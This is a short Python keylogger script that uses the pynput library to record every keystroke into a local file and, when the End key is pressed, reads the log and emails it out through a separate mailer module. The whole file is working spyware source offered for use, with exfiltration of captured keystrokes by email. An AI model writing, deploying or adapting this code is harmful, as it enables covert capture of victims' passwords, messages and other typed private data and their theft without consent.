from pynput import keyboard
from pynput.keyboard import Key, Listener
from mailer import Mailer
# create sendEmail file and set there code 
import sendEmail

def WhenPressKey(key):
    fp = open("logs.txt", "a")
    print(key)
    if key != keyboard.Key.end:
        fp.write(str(key) + ",")
    else:
        print('End Listening')
        fp.close()
        res = open('logs.txt','r')
        sendEmail.sendMail(res.read())
        exit(0)

with Listener(on_press=WhenPressKey) as listener:
    listener.join()

